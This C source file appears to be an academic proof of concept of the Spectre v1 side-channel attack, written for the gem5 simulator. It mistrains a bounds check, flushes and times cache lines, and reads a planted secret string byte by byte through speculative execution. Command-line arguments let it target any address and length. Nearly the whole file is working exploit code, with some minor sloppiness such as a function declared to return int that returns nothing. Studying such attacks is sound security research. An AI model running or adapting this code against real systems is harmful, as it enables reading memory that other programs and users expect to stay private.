/* Anastasios (Tasos) Zacharopoulos
* Informatics Department,
* Aristotele University of Thessaloniki, Greece
* Side Channel Attack (Spectre) Implementation on gem5 simulator  2022
*/


#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <x86intrin.h> 

unsigned int array1_size = 16;
uint8_t array1[16] = { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16};
uint8_t unused2[64];
uint8_t array2[256 * 512];
int results[256];
unsigned int junk = 0;

char * secret = "Changes we made to the code from auth.csd";

uint8_t temp = 0; 

void victim_function(size_t x) {
  if (x < array1_size) {
    temp &= array2[array1[x] * 512];
  }
}

void tamiMe(int cache_hit_threshold, int tries){
  register uint64_t time1, time2;
  volatile uint8_t * addr;
  int mix_i;

  for (int i = 0; i < 256; i++) {
     
    mix_i = ((i * 167) + 13) & 255;
    addr = & array2[mix_i * 512];

    time1 = __rdtscp( & junk); 
    junk = * addr; 
    time2 = __rdtscp( & junk) - time1; 

    if ((int)time2 <= cache_hit_threshold && mix_i != array1[tries % array1_size])
      results[mix_i]++;  
  }
}
int changesVali(int* k , int* j){
  int i;
  *j = -1;
  *k = -1;
  for (i = 0; i < 256; i++) {
    if (*j < 0 || results[i] >= results[*j]) {
      *k = *j;
      *j = i;
    } else if (*k < 0 || results[i] >= results[*k]) {
      *k = i;
    }
  }
}

void trainingFlush(int cache_hit_threshold, size_t malicious_x, uint8_t value[2], int score[2]){

  int tries, i, j, k;
  size_t training_x, x;
  volatile uint8_t * addr;
  void tamiMe(int cache_hit_threshold, int tries );
  int changesVali();

  for (i = 0; i < 256; i++)
    results[i] = 0;
  for (tries = 999; tries > 0; tries--) {

    for (i = 0; i < 256; i++)
      _mm_clflush( & array2[i * 512]); 

    training_x = tries % array1_size;
    for (j = 29; j >= 0; j--) {
      _mm_clflush( & array1_size);

      for (volatile int z = 0; z < 100; z++) {}

      x = ((j % 6) - 1) & ~0xFFFF; 
      x = (x | (x >> 16)); 
      x = training_x ^ (x & (malicious_x ^ training_x));

      victim_function(x);
    }
    tamiMe(cache_hit_threshold ,tries);
    changesVali(&k, &j);

    if (results[j] >= (2 * results[k] + 5) || (results[j] == 2 && results[k] == 0)){
      break;
    }
  }
  results[0] ^= junk; 
  value[0] = (uint8_t) j;
  score[0] = results[j];
  value[1] = (uint8_t) k;
  score[1] = results[k];
}

int main(int argc, const char * * argv) {
  void StrainingFlush(int cache_hit_threshold, size_t malicious_x, uint8_t value[2], int score[2]);
  int cache_hit_threshold = 80;
  size_t malicious_x = (size_t)(secret - (char * ) array1);  
  int len = 40;  
  int score[2];
  uint8_t value[2];
  int i;
  
  for (i = 0; i < (int)sizeof(array2); i++) {
    array2[i] = 1; 
  }

  if (argc >= 2) {
    sscanf(argv[1], "%d", &cache_hit_threshold);
  }

  if (argc >= 4) {
    sscanf(argv[2], "%p", (void * * )( &malicious_x));

    malicious_x -= (size_t) array1;

    sscanf(argv[3], "%d", &len);
  }

  printf("Using a cache hit threshold of %d.\n", cache_hit_threshold);
  printf("\n");
  printf("Reading %d bytes:\n", len);

  while (--len >= 0) {
    printf("Reading at malicious_x = %p... ", (void * ) malicious_x);

    trainingFlush(cache_hit_threshold, malicious_x++, value, score);

    printf("%s: ", (score[0] >= 2 * score[1] ? "Success" : "Unclear"));
    printf("0x%02X=’%c’ score=%d ", value[0],
      (value[0] > 31 && value[0] < 127 ? value[0] : '?'), score[0]);
    
    if (score[1] > 0) {
      printf("(second best: 0x%02X=’%c’ score=%d)", value[1],
      (value[1] > 31 && value[1] < 127 ? value[1] : '?'), score[1]);
    }

    printf("\n");
  }
  return (0);
}
